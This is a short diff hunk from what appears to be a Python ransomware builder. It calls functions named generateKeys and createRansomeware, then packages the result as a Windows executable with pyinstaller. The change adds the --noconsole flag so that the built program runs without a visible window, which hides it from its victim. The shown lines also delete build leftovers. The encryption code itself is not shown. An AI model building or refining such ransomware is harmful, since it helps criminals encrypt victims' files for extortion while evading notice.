@@ -50,7 +50,7 @@ def createRansomeware():
 generateKeys()
 privateKey, publicKey = loadKeys()
 createRansomeware()
-createExe = "pyinstaller -F e" + c + ".py"
+createExe = "pyinstaller -F --noconsole e" + c + ".py"
 spec = "del e" + c + ".spec"
 os.system(createExe)
 os.system("rmdir /s /q __pycache__")
